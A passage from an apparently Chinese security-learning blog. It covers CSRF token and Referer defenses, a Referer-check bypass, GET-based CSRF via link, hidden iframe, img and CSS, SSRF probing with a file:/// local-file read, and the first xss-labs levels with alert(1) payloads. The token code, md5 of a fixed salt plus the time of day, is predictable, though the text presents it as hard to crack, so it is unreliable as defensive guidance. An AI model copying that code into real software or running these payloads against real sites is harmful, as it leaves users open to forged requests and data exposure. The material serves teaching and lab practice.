<p>远程构造CSRF利用POC，那么直接中招。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF。如果令牌不正确，那么不执行操作。并给出提示内容</p>
<h5 id="3、生成Token代码分析"><a href="#3、生成Token代码分析" class="headerlink" title="3、生成Token代码分析"></a>3、生成Token代码分析</h5><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以破解的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">&#x2F;&#x2F; 获取简单的日期（年、月、日）</span><br><span class="line">	$salt&#x3D;&quot;test&quot;.date(&quot;Y&#x2F;m&#x2F;d&quot;);</span><br><span class="line">&#x2F;&#x2F; 进行md5加密</span><br><span class="line">	$token&#x3D;md5($salt);</span><br><span class="line">&#x2F;&#x2F; 返回值</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用函数查看生成的token</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430154552126.png" alt="image-20200430154552126"></p>
<p>在浏览器打开，然后多次运行发现Token值不发生变化</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430154635902.png" alt="image-20200430154635902"></p>
<p>如果生成的Token值都一样就没有防御措施了</p>
<p>为了这种唯一性设置对应的时间，不是年月日，而是<strong>时分秒</strong>，生成字符串不断变化，而且是唯一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">&#x2F;&#x2F; 获取简单的日期（年、月、日）</span><br><span class="line">	$salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">&#x2F;&#x2F; 进行md5加密</span><br><span class="line">	$token&#x3D;md5($salt);</span><br><span class="line">&#x2F;&#x2F; 返回值</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次在刷新浏览器，发现每一秒的Token值都是不一样的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430155213159.png" alt="image-20200430155213159"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430155222841.png" alt="image-20200430155222841"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430155235926.png" alt="image-20200430155235926"></p>
<p>当前可以将$salt中的test替换成任意的字符串，尽可能复杂而不容易被破解，这个test容易被破解</p>
<p>这样生成的Token就不容易被破解出来，因为是加上当前的时间和字符串的话，如果简单很有可能被猜解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">&#x2F;&#x2F; 获取简单的日期（年、月、日）</span><br><span class="line">	$salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">&#x2F;&#x2F; 进行md5加密</span><br><span class="line">	$token&#x3D;md5($salt);</span><br><span class="line">&#x2F;&#x2F; 返回值</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4、使用Token进行CSRF漏洞防御"><a href="#4、使用Token进行CSRF漏洞防御" class="headerlink" title="4、使用Token进行CSRF漏洞防御"></a>4、使用Token进行CSRF漏洞防御</h5><p>1、登录验证成功之后，在会话SESSION[“user_token”]中保存Token。</p>
<p>2、在后台操作中，增删改查表单中添加隐藏域hidden，设置value为Token</p>
<p>3、提交之后进行验证Token是否正确。</p>
<p>代码分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();</span><br><span class="line">	function token_generate()&#123;</span><br><span class="line">		$salt&#x3D;&quot;test&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">		$token&#x3D;md5($salt);</span><br><span class="line">		return $token;</span><br><span class="line">	&#125;</span><br><span class="line">	$token&#x3D;token_generate();</span><br><span class="line">	$_SESSION[&quot;USER_TOKEN&quot;]&#x3D;$token;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;CSRF_Token&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;h1&gt;CSRF_Token&lt;&#x2F;h1&gt;</span><br><span class="line">			&lt;form action&#x3D;&quot;check.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;我提交了&quot; &#x2F;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;user_token&quot; value&#x3D;&quot;&lt;?php echo $token;?&gt;&quot; &#x2F;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt;</span><br><span class="line">			&lt;&#x2F;form&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/03/CSRF_SSRF/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200430161915623.png" alt="image-20200430161915623"></p>
<p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162134971.png" alt="image-20200430162134971"></p>
<p>F12查看Ntwork</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162202451.png" alt="image-20200430162202451"></p>
<p>点击提交返回successful</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162220524.png" alt="image-20200430162220524"></p>
<p>复制URL和源码进行POC修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162606761.png" alt="image-20200430162606761"></p>
<p>在源码中修改地址，这里的Token和原始的Token是不一样的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430162657428.png" alt="image-20200430162657428"></p>
<h4 id="CSRF绕过Referer技巧"><a href="#CSRF绕过Referer技巧" class="headerlink" title="CSRF绕过Referer技巧"></a>CSRF绕过Referer技巧</h4><h5 id="1、Referer防御CSRF原理"><a href="#1、Referer防御CSRF原理" class="headerlink" title="1、Referer防御CSRF原理"></a>1、Referer防御CSRF原理</h5><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>
<p>当用户点击被构造好的CSRF利用页面，那么执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务器判断Referer值是否与服务器的域名信息有关。如果不相关则不执行操作</p>
<h5 id="2、Referer防御代码编写"><a href="#2、Referer防御代码编写" class="headerlink" title="2、Referer防御代码编写"></a>2、Referer防御代码编写</h5><p>在PHP中使用$_SERVER[‘HTTP_REFERER’]获取页面提交请求中的Referer值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 获取REFERER，用其与相关的字符串比较。例如当前域名xx.com,使用strpos进行包含验证，如果提交的REFERER包含了xx.com那么判断成功。返回True，如果为false，它请求的上一个页面不是xx.com当中的页面，这个时候判断失败。</span><br><span class="line">	if(strpos($_SERVER[&#39;HTTP_REFERER&#39;],&#39;XX.com&#39;)!&#x3D;&#x3D;false)</span><br><span class="line">	&#123;</span><br><span class="line">		判断成功</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		判断失败</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3、绕过Referer技巧"><a href="#3、绕过Referer技巧" class="headerlink" title="3、绕过Referer技巧"></a>3、绕过Referer技巧</h5><p>技巧：如果服务端只判断当前的Referer中是否具有域名，那么直接可以新建文件夹进行绕过。</p>
<p>测试页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430194404169.png" alt="image-20200430194404169"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430194441166.png" alt="image-20200430194441166"></p>
<p>在站点目录下新建一个ip的文件夹，将CSRF放在这个文件夹中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220131544.png" alt="image-20200430220131544"></p>
<p>放进去后需要编辑index内容，这个链接连接到了一个CSRF的绕过，这个链接只判断了referer，这样我们就可以进行绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220220385.png" alt="image-20200430220220385"></p>
<p>打开这个ip的页面，有1这个超链接进行打开，可以看到burpsuite中抓取到的referer值包含对应的IP地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220433453.png" alt="image-20200430220433453"></p>
<p>请求的页面是csrf_test/referer_test.php，如果不包含对应的ip就不能进行对应的操作。将内容放过</p>
<p>页面返回successful，成功触发了对应的操作</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430220743873.png" alt="image-20200430220743873"></p>
<h5 id="4、Burpsuite自动生成POC"><a href="#4、Burpsuite自动生成POC" class="headerlink" title="4、Burpsuite自动生成POC"></a>4、Burpsuite自动生成POC</h5><p>Burpsuite只有在专业版才能生成POC，社区版不能生成POC</p>
<p>将当前页面提交，然后截断</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430221411622.png" alt="image-20200430221411622"></p>
<p>截断之后在burpsuite右键选择Engaenment tools中的最后一个G开头的，这样就会输出POC代码，复制在一个新文件当中保存进去就行，或者直接使用对应提示进行保存</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430221527972.png" alt="image-20200430221527972"></p>
<h4 id="GET型CSRF漏洞利用方法"><a href="#GET型CSRF漏洞利用方法" class="headerlink" title="GET型CSRF漏洞利用方法"></a>GET型CSRF漏洞利用方法</h4><h5 id="1、链接利用"><a href="#1、链接利用" class="headerlink" title="1、链接利用"></a>1、链接利用</h5><p>在HTML中，a标签代表链接，可以将当前的“页面位置”指引到其他位置。实现跳转的过程</p>
<p>移动的“页面位置”需要发送对应的请求到链接所指向的地址，然后返回响应。</p>
<p><code>&lt;a href=&quot;请求地址，会被http请求到的未知，可以携带GET型参数&quot;&gt;内容&lt;/a&gt;</code></p>
<p><code>&lt;a href=&quot;http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=Mars&amp;password=123456&quot;&gt;请点击我&lt;/a&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501191106058.png" alt="image-20200501191106058"></p>
<h5 id="2、iframe利用"><a href="#2、iframe利用" class="headerlink" title="2、iframe利用"></a>2、iframe利用</h5><p>iframe标签内容将在页面加载 过程中自动进行加载，src指向的位置就是页面请求的位置</p>
<p>注意：可以设置iframe的style -&gt; display:none，以此来不显示iframe加载的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501192508231.png" alt="image-20200501192508231"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195000134.png" alt="image-20200501195000134"></p>
<h5 id="3、img标签利用"><a href="#3、img标签利用" class="headerlink" title="3、img标签利用"></a>3、img标签利用</h5><p>img标签的内容会随着页面加载而被请求，以此src只想的位置会在页面加载过程中进行请求。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195351849.png" alt="image-20200501195351849"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195417245.png" alt="image-20200501195417245"></p>
<h5 id="4、CSS-backgroud利用"><a href="#4、CSS-backgroud利用" class="headerlink" title="4、CSS-backgroud利用"></a>4、CSS-backgroud利用</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195656147.png" alt="image-20200501195656147"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501195618215.png" alt="image-20200501195618215"></p>
<h4 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h4><h5 id="1、验证码防御"><a href="#1、验证码防御" class="headerlink" title="1、验证码防御"></a>1、验证码防御</h5><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。</p>
<p>CSRF在用户不知情的情况下弯沉个对应操作，而验证码强制用户与应用程序交互，才能最终完成操作，通常情况下，验证码能够很好地遏制CSRF。</p>
<p>出于用户体验考虑，不可能每一个操作都加入验证码。所以验证码只作为辅助手段，不作为防御CSRF的主要解决方案。</p>
<p>验证码防御也可以被认为是二次验证。</p>
<h5 id="2、Referer-Check防御"><a href="#2、Referer-Check防御" class="headerlink" title="2、Referer Check防御"></a>2、Referer Check防御</h5><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501200632489.png" alt="image-20200501200632489"></p>
<p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
<h5 id="3、Anti-CSRF-Token防御"><a href="#3、Anti-CSRF-Token防御" class="headerlink" title="3、Anti CSRF Token防御"></a>3、Anti CSRF Token防御</h5><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的</p>
<p>防御措施就是生成一个随机且不被轻易猜测的参数。目前大多是防御都是采用token(不可预测)</p>
<h5 id="4、Token泄露"><a href="#4、Token泄露" class="headerlink" title="4、Token泄露"></a>4、Token泄露</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501201022138.png" alt="image-20200501201022138"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200501201116900.png" alt="image-20200501201116900"></p>
<h4 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h4><h5 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h5><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统（正因为请求是由服务端发起的，所以服务端能请求到自身相连而与外网隔离的内部系统）。</p>
<h5 id="SSRF原理"><a href="#SSRF原理" class="headerlink" title="SSRF原理"></a>SSRF原理</h5><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等，利用的是服务端的请求伪造。SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器</p>
<h5 id="主要攻击方法"><a href="#主要攻击方法" class="headerlink" title="主要攻击方法"></a>主要攻击方法</h5><ul>
<li>对外网、服务器所在内网、本地进行端口扫描、获取一些服务的banner信息。</li>
<li>攻击运行在内网或本地的应用程序上。</li>
<li>对内网的Web应用进行指纹识别，识别企业内部的资产信息。</li>
<li>攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击（比如：struts2、SQli等）。</li>
<li>利用file协议读取本地文件等。</li>
</ul>
<h5 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h5><p>SSRF漏洞利用的测试地址：<a href="http://127.0.0.1/ssrf.php?url=http://127.0.0.1/2.php" target="_blank" rel="noopener">http://127.0.0.1/ssrf.php?url=http://127.0.0.1/2.php</a></p>
<p>页面ssrf.php实现的功能是获取GET参数URL，然后将URL的内容返回网页上。如果将请求的网址篡改为<a href="http://www,baidu.com，则会显示http://www.baidu.com的页面内容" target="_blank" rel="noopener">http://www,baidu.com，则会显示http://www.baidu.com的页面内容</a></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155154844.png" alt="image-20200503155154844"></p>
<p>但是，当设置参数URL为内网地址是，则会泄露内网信息，例如，当URL=192.168.0.2:3306时页面返回“当前地址不允许连接到Mysql服务器”，说明192.168.0.2存在Mysql服务</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155403764.png" alt="image-20200503155403764"></p>
<p>访问ssrf.php?url=file:///c:/Windows/win.ini即可读取本地文件。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155448181.png" alt="image-20200503155448181"></p>
<h5 id="SSRF漏洞代码分析"><a href="#SSRF漏洞代码分析" class="headerlink" title="SSRF漏洞代码分析"></a>SSRF漏洞代码分析</h5><p>​        在页面SSRF.php中，程序获取GET参数URL，通过curl_init()初始化curl组件后，将参数URL带入curl_setopt（$ch,CURLOPT_URL，$url），然后调用所以curl-exec请求该URL。由于服务端会将banner信息返回客户端，所以可以根据banner判断主机是否存在某些服务。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200503155657246.png" alt="image-20200503155657246"></p>
<h5 id="SSRF漏洞修复建议"><a href="#SSRF漏洞修复建议" class="headerlink" title="SSRF漏洞修复建议"></a>SSRF漏洞修复建议</h5><p>针对SSRF漏洞修复，有以下几点</p>
<ul>
<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS请求。</li>
<li>限制不能访问内网的IP，以防止对内网进行攻击。</li>
<li>屏蔽返回的详细信息。</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-xss-labs" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/04/22/xss-labs/" class="article-date">
  	<time datetime="2020-04-22T12:48:52.281Z" itemprop="datePublished">2020-04-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/22/xss-labs/">
        xss-labs
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="xss-labs第一关"><a href="#xss-labs第一关" class="headerlink" title="xss-labs第一关"></a>xss-labs第一关</h4><p>源码</p>
<p>分析</p>
<p>分析：</p>
<ul>
<li>后台源码将用户以GET方式提交的参数name，原封不动地显示在HTML页面中，所以将弹框语句放入name变量中即可：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level2.php?keyword&#x3D;test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level1&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造一个内容，这里输入111，F12查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113056134.png" alt="image-20200417113056134"></p>
<p>这里没有进行任何过滤和防护，而且是直接在h2标签中，这样直接使用使用script标签构造XSS</p>
<p>payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113334965.png" alt="image-20200417113334965"></p>
<h4 id="xss-labs第二关"><a href="#xss-labs第二关" class="headerlink" title="xss-labs第二关"></a>xss-labs第二关</h4><p>源码</p>
<p>分析：</p>
<p><code>htmlspecialchars</code>：</p>
<ul>
<li>作用：把预定义的字符转换为 HTML 实体，而不是作为标签运行；如果不用HTMLSpecialChars，就会导致读取时，把” <script>"之类的HTML标签带有功能地输出。</li>
<li>HTML实体格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;entity_name;</span><br><span class="line">或者</span><br><span class="line">&amp;#entity_number;</span><br></pre></td></tr></table></figure>

<ul>
<li>转化规则：</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417154345824.png" alt="image-20200417154345824"></p>
<ul>
<li>如下例，在使用了htmlspecialchars后，将输出字符串""；当不使用时，则会弹框。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">echo htmlspecialchars($str); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>本例中，在返回的HTML页面的第一处使用了htmlspecialchars，而第二处没有使用，且两处都没有过滤机制。所以我们在第二处闭合<code>&lt;input&gt;</code>标签，直接弹框：</p>
<p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level3.php?writing&#x3D;wait&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level2&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level2.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level2.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，F12查看，如果找不到ctrl+F进行搜索。</p>
<p>这里在input标签中，进行了双引号包裹。所以需要进行闭合标签</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113440241.png" alt="image-20200417113440241"></p>
<p>闭合标签因为是双引号闭合格式"></p>
<p>复制payload提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113634778.png" alt="image-20200417113634778"></p>
<h4 id="xss-labs第三关"><a href="#xss-labs第三关" class="headerlink" title="xss-labs第三关"></a>xss-labs第三关</h4><p>源码</p>
<p>分析</p>
<p>一共有两处转义：</p>
<ul>
<li>第一处转义，输入被转义为html实体，不能直接执行；</li>
<li>第二处转义，输入被转义为html实体，不能直接执行，也不能闭合双引号。但是单引号没被转义。</li>
<li>所以可以用单引号闭合input标签，使用不包含被转义特殊字符的弹框方式。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level4.php?keyword&#x3D;try harder!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;&#x2F;title&gt;</span><br><span 